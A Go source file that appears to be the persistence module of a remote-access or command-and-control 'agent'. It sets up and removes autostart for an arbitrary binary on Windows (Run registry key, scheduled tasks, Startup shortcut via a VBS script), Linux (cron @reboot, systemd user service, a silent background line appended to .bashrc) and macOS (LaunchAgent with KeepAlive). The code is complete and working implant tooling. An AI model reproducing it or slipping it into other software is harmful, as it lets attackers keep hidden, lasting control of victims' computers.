package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

// SetupPersistence configures persistence mechanism
func SetupPersistence(method, name, agentPath string, args []string) error {
	switch runtime.GOOS {
	case "windows":
		return setupWindowsPersistence(method, name, agentPath, args)
	case "linux":
		return setupLinuxPersistence(method, name, agentPath, args)
	case "darwin":
		return setupMacOSPersistence(method, name, agentPath, args)
	default:
		return fmt.Errorf("unsupported OS: %s", runtime.GOOS)
	}
}

// RemovePersistence removes persistence mechanism
func RemovePersistence(method, name string) error {
	switch runtime.GOOS {
	case "windows":
		return removeWindowsPersistence(method, name)
	case "linux":
		return removeLinuxPersistence(method, name)
	case "darwin":
		return removeMacOSPersistence(method, name)
	default:
		return fmt.Errorf("unsupported OS: %s", runtime.GOOS)
	}
}

// Windows Persistence Methods
func setupWindowsPersistence(method, name, agentPath string, args []string) error {
	switch method {
	case "registry_run":
		return setupRegistryRun(name, agentPath, args)
	case "schtasks_onlogon":
		return setupScheduledTask(name, agentPath, args, "ONLOGON")
	case "schtasks_daily":
		return setupScheduledTask(name, agentPath, args, "DAILY")
	case "startup_folder":
		return setupStartupFolder(name, agentPath, args)
	default:
		return fmt.Errorf("unknown Windows persistence method: %s", method)
	}
}

func removeWindowsPersistence(method, name string) error {
	switch method {
	case "registry_run":
		return removeRegistryRun(name)
	case "schtasks_onlogon", "schtasks_daily":
		return removeScheduledTask(name)
	case "startup_folder":
		return removeStartupFolder(name)
	default:
		return fmt.Errorf("unknown Windows persistence method: %s", method)
	}
}

func setupRegistryRun(name, agentPath string, args []string) error {
	value := fmt.Sprintf("\"%s\"", agentPath)
	if len(args) > 0 {
		value += " " + strings.Join(args, " ")
	}
	
	cmd := exec.Command("reg", "add",
		"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		"/v", name,
		"/t", "REG_SZ",
		"/d", value,
		"/f")
	
	if output, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("failed to add registry key: %v - %s", err, output)
	}
	return nil
}

func removeRegistryRun(name string) error {
	cmd := exec.Command("reg", "delete",
		"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		"/v", name,
		"/f")
	
	if output, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("failed to remove registry key: %v - %s", err, output)
	}
	return nil
}

func setupScheduledTask(name, agentPath string, args []string, schedule string) error {
	cmdArgs := []string{
		"/create",
		"/tn", name,
		"/tr", fmt.Sprintf("\"%s\" %s", agentPath, strings.Join(args, " ")),
		"/sc", schedule,
		"/f",
	}
	
	if schedule == "DAILY" {
		cmdArgs = append(cmdArgs, "/st", "09:00")
	}
	
	cmd := exec.Command("schtasks", cmdArgs...)
	if output, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("failed to create scheduled task: %v - %s", err, output)
	}
	return nil
}

func removeScheduledTask(name string) error {
	cmd := exec.Command("schtasks", "/delete", "/tn", name, "/f")
	if output, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("failed to remove scheduled task: %v - %s", err, output)
	}
	return nil
}

func setupStartupFolder(name, agentPath string, args []string) error {
	startupPath := filepath.Join(os.Getenv("APPDATA"),
		"Microsoft\\Windows\\Start Menu\\Programs\\Startup",
		name+".lnk")
	
	// Create VBS script to create shortcut
	vbsContent := fmt.Sprintf(`
Set objShell = CreateObject("WScript.Shell")
Set objShortcut = objShell.CreateShortcut("%s")
objShortcut.TargetPath = "%s"
objShortcut.Arguments = "%s"
objShortcut.WorkingDirectory = "%s"
objShortcut.Save
`, startupPath, agentPath, strings.Join(args, " "), filepath.Dir(agentPath))
	
	vbsPath := filepath.Join(os.TempDir(), "create_shortcut.vbs")
	if err := os.WriteFile(vbsPath, []byte(vbsContent), 0644); err != nil {
		return err
	}
	defer os.Remove(vbsPath)
	
	cmd := exec.Command("cscript", "/nologo", vbsPath)
	if output, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("failed to create startup shortcut: %v - %s", err, output)
	}
	return nil
}

func removeStartupFolder(name string) error {
	startupPath := filepath.Join(os.Getenv("APPDATA"),
		"Microsoft\\Windows\\Start Menu\\Programs\\Startup",
		name+".lnk")
	return os.Remove(startupPath)
}

// Linux Persistence Methods
func setupLinuxPersistence(method, name, agentPath string, args []string) error {
	switch method {
	case "cron_reboot":
		return setupCronReboot(name, agentPath, args)
	case "systemd_user":
		return setupSystemdUser(name, agentPath, args)
	case "bashrc":
		return setupBashrc(name, agentPath, args)
	default:
		return fmt.Errorf("unknown Linux persistence method: %s", method)
	}
}

func removeLinuxPersistence(method, name string) error {
	switch method {
	case "cron_reboot":
		return removeCronReboot(name)
	case "systemd_user":
		return removeSystemdUser(name)
	case "bashrc":
		return removeBashrc(name)
	default:
		return fmt.Errorf("unknown Linux persistence method: %s", method)
	}
}

func setupCronReboot(name, agentPath string, args []string) error {
	cronLine := fmt.Sprintf("@reboot %s %s # %s", agentPath, strings.Join(args, " "), name)
	
	// Get current crontab
	cmd := exec.Command("crontab", "-l")
	output, _ := cmd.Output()
	
	// Add new line
	newCron := string(output) + cronLine + "\n"
	
	// Write back
	cmd = exec.Command("crontab", "-")
	cmd.Stdin = strings.NewReader(newCron)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to update crontab: %v", err)
	}
	return nil
}

func removeCronReboot(name string) error {
	cmd := exec.Command("crontab", "-l")
	output, err := cmd.Output()
	if err != nil {
		return err
	}
	
	// Remove line with name
	lines := strings.Split(string(output), "\n")
	var newLines []string
	for _, line := range lines {
		if !strings.Contains(line, "# "+name) {
			newLines = append(newLines, line)
		}
	}
	
	// Write back
	cmd = exec.Command("crontab", "-")
	cmd.Stdin = strings.NewReader(strings.Join(newLines, "\n"))
	return cmd.Run()
}

func setupSystemdUser(name, agentPath string, args []string) error {
	serviceContent := fmt.Sprintf(`[Unit]
Description=%s
After=network.target

[Service]
Type=simple
ExecStart=%s %s
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
`, name, agentPath, strings.Join(args, " "))
	
	servicePath := filepath.Join(os.Getenv("HOME"), ".config/systemd/user", name+".service")
	
	// Create directory
	os.MkdirAll(filepath.Dir(servicePath), 0755)
	
	// Write service file
	if err := os.WriteFile(servicePath, []byte(serviceContent), 0644); err != nil {
		return err
	}
	
	// Reload and enable
	exec.Command("systemctl", "--user", "daemon-reload").Run()
	if err := exec.Command("systemctl", "--user", "enable", name).Run(); err != nil {
		return fmt.Errorf("failed to enable service: %v", err)
	}
	
	return exec.Command("systemctl", "--user", "start", name).Run()
}

func removeSystemdUser(name string) error {
	exec.Command("systemctl", "--user", "stop", name).Run()
	exec.Command("systemctl", "--user", "disable", name).Run()
	
	servicePath := filepath.Join(os.Getenv("HOME"), ".config/systemd/user", name+".service")
	return os.Remove(servicePath)
}

func setupBashrc(name, agentPath string, args []string) error {
	bashrcPath := filepath.Join(os.Getenv("HOME"), ".bashrc")
	
	// Read current bashrc
	content, err := os.ReadFile(bashrcPath)
	if err != nil {
		return err
	}
	
	// Add persistence line
	persistLine := fmt.Sprintf("\n# %s\n(%s %s &) 2>/dev/null\n", 
		name, agentPath, strings.Join(args, " "))
	
	// Append to bashrc
	return os.WriteFile(bashrcPath, append(content, []byte(persistLine)...), 0644)
}

func removeBashrc(name string) error {
	bashrcPath := filepath.Join(os.Getenv("HOME"), ".bashrc")
	
	content, err := os.ReadFile(bashrcPath)
	if err != nil {
		return err
	}
	
	// Remove lines containing the name
	lines := strings.Split(string(content), "\n")
	var newLines []string
	skip := false
	for _, line := range lines {
		if strings.Contains(line, "# "+name) {
			skip = true
			continue
		}
		if skip && strings.TrimSpace(line) == "" {
			skip = false
			continue
		}
		if !skip {
			newLines = append(newLines, line)
		}
	}
	
	return os.WriteFile(bashrcPath, []byte(strings.Join(newLines, "\n")), 0644)
}

// macOS Persistence Methods
func setupMacOSPersistence(method, name, agentPath string, args []string) error {
	switch method {
	case "launchagent":
		return setupLaunchAgent(name, agentPath, args)
	default:
		return fmt.Errorf("unknown macOS persistence method: %s", method)
	}
}

func removeMacOSPersistence(method, name string) error {
	switch method {
	case "launchagent":
		return removeLaunchAgent(name)
	default:
		return fmt.Errorf("unknown macOS persistence method: %s", method)
	}
}

func setupLaunchAgent(name, agentPath string, args []string) error {
	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>`, name, agentPath)
	
	for _, arg := range args {
		plistContent += fmt.Sprintf("\n        <string>%s</string>", arg)
	}
	
	plistContent += `
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>`
	
	plistPath := filepath.Join(os.Getenv("HOME"), "Library/LaunchAgents", name+".plist")
	
	// Create directory
	os.MkdirAll(filepath.Dir(plistPath), 0755)
	
	// Write plist
	if err := os.WriteFile(plistPath, []byte(plistContent), 0644); err != nil {
		return err
	}
	
	// Load agent
	return exec.Command("launchctl", "load", plistPath).Run()
}

func removeLaunchAgent(name string) error {
	plistPath := filepath.Join(os.Getenv("HOME"), "Library/LaunchAgents", name+".plist")
	
	// Unload agent
	exec.Command("launchctl", "unload", plistPath).Run()
	
	// Remove plist
	return os.Remove(plistPath)
}
